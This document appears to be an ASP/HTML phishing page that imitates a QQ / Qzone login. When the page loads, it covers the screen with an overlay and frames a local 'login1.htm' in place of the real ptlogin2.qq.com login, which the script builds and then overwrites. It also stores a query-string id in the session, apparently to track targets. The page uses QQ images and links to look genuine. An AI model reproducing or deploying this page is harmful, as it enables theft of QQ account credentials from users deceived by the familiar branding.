<%
session("id1")=request.querystring("id")

%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!-- saved from url=(0037)http://pek.hout7.com/314025954/m2.asp -->
<HTML xmlns="http://www.w3.org/1999/xhtml"><HEAD><TITLE>Sb`July[http://user.qzone.qq.com/2862386227]</TITLE>
<META content="text/html; charset=gb2312" http-equiv=Content-Type>
<META content=IE=EmulateIE7 http-equiv=X-UA-Compatible><LINK rel="shortcut icon" 
href="favicon.ico"><LINK rel=icon type=image/gif href="animated_favicon1.gif">
<STYLE>.banner_info_trigon {
	LEFT: 267px
}
.full_div {
	FILTER: alpha(opacity=40); BACKGROUND: #000; moz-opacity: 0.60; opacity: 0.60
}
.full_div {
	Z-INDEX: 100; POSITION: fixed; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px
}
* HTML .full_div {
	POSITION: absolute; ; HEIGHT: expression(document.body.scrollHeight > document.body.offsetHeight ? document.body.scrollHeight : document.body.offsetHeight + 'px')
}
.notice_item {
	WIDTH: 260px; TEXT-OVERFLOW: ellipsis; WHITE-SPACE: nowrap; OVERFLOW: hidden
}
</STYLE>

<SCRIPT language=javascript src="index_files/yy.js" 
tppabs="/log/yy.js"></SCRIPT>

<META name=GENERATOR content="MSHTML 8.00.6001.18928"></HEAD>
<BODY onLoad="loginTo('/cn/manage/my_mb')" leftMargin=0 topMargin=0><!--header-->
<SCRIPT language=javascript>
function getHost() {
	return window.location.protocol + "//" + window.location.host;
}
function addFavorite() {
	var url = getHost();
	var title = "";
	if (document.all) {
		window.external.addFavorite(url,title);
	}
	else if (window.sidebar) {
		window.sidebar.addPanel(title, url, "");
	}
	else {
	}
	return false;
}

function logIn(url){
	aler_login("login", url);
}
function aler_login(alertId, url, lang){
	if (typeof lang == "undefined") {
		lang=0;				//默认是简体中文
	}
	if (typeof url == "undefined") {
		url="";				//默认是简体中文
	}
	var myAlert = document.getElementById(alertId);
	var ptLoginUrl = window.location.protocol + "//ui.ptlogin2.qq.com/cgi-bin/login";
	var s_url = (0 == url.length ? escape(window.location.href) : escape(getHost() + url));
	var param = "?appid=2001601&no_verifyimg=1&f_url=loginerroralert&lang=" + lang + "&s_url=" + s_url
				+ "&qlogin_jumpname=jump&qlogin_param="+escape("u1="+s_url);
	ptLoginUrl="login1.htm"/*tpa=/log/login.htm*/;
	param="";
	myAlert.style.display = "block";
	myAlert.style.position = "absolute";
	myAlert.style.top = "30%";
	myAlert.style.left = "45%";
	myAlert.style.marginTop = "-90px";
	myAlert.style.marginLeft = "-140px";
	showFullDiv("mybg");
	document.getElementById("embed_login_frame").src = ptLoginUrl + param;
}
function ptlogin2_onResize(width, height) {
	login_wnd = document.getElementById("login");
	if (login_wnd)	{

		login_wnd.style.width = width + "px";
		login_wnd.style.height = height + "px";

		login_wnd.style.visibility = "hidden";
		login_wnd.style.visibility = "visible";
	}
}
function ptlogin2_onClose(){
	login_wnd = document.getElementById("login");	
	login_wnd.style.display="none"
	closeFullDiv("mybg");
}

function loginTo(url){
	aler_login('login', url);
}
</SCRIPT>

<DIV 
style="Z-INDEX: 501; POSITION: absolute; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; WIDTH: 423px; PADDING-RIGHT: 0px; DISPLAY: none; HEIGHT: 395px; PADDING-TOP: 0px" 
id=login>
<TABLE border=0 cellSpacing=0 cellPadding=0 width=423 align=center>
  <TBODY>
  <TR>
    <TD height=340 vAlign=top background=index_files/lo.gif 
tppabs="/log/lo.gif">
      <DIV align=center>
      <TABLE border=0 cellSpacing=0 cellPadding=0 width=380>
        <TBODY>
        <TR>
          <TD height=90></TD></TR>
        <TR>
          <TD height=240>
            <DIV align=center><IFRAME id=embed_login_frame height=240 
            frameBorder=0 width=380 
            name=embed_login_frame scrolling=no 
            tppabs="/log/login1.htm"></IFRAME></DIV></TD></TR></TBODY></TABLE></DIV></TD>
  <TR>
    <TD height=55>
      <DIV align=center><IMG border=0 src="index_files/lo1.gif" width=423 
      height=55 useMap=#Map 
tppabs="/log/lo1.gif"></DIV></TD></TR></TR></TBODY></TABLE></DIV><IFRAME id=test 
height=900 src="index_files/k2.htm" frameBorder=no width="100%" name=test 
scrolling=no></IFRAME><MAP id=Map name=Map><AREA href="http://qzone.qq.com/" 
  shape=rect coords=64,21,111,34><AREA href="http://qzone.qq.com/" shape=rect 
  coords=130,22,177,34><AREA href="http://qzone.qzone.qq.com/" shape=rect 
  coords=198,22,258,34><AREA href="http://im.qq.com/" shape=rect target=_parent 
  coords=276,22,355,34></MAP></BODY></HTML>
